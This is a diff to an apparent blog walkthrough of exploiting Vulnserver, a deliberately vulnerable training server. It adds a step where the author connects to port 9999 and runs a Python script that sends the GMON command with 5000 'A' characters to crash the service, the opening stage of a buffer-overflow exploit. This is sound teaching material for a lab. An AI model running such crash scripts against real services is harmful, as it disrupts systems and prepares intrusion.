@@ -25,6 +25,26 @@ We will be taking crack at the [Vulnserver](https://github.com/stephenbradshaw/v
 
 Initial Crash
 ---
-When starting the application, we notice it starts listening on TCP port `9999`. We will take note of this for the future. After starting the server, we connect to it via `nc` on port 9999 and execute the command `HELP` to view a list of commands we can issue.
+When starting the application, we notice it starts listening on TCP port `9999`. We will take note of this for the future. After starting the server, we connect to it via `nc` on port 9999 and execute the command `HELP` to view a list of commands we can issue:
 <img src="{{ site.url }}{{ site.baseurl }}/images/net9999.png" alt="">
 
+After we view the list of commands we choose to reverse engineer the command `GMON`. Here is the python script we are going to execute to see if we can crash the application:
+```console
+root@kali:~/Desktop# cat CRASH.py 
+#!/usr/bin/python
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+pwn = "A" * 5000
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.134", 9999))
+
+s.send(command+pwn)
+s.recv(1024)
+s.close()
+```
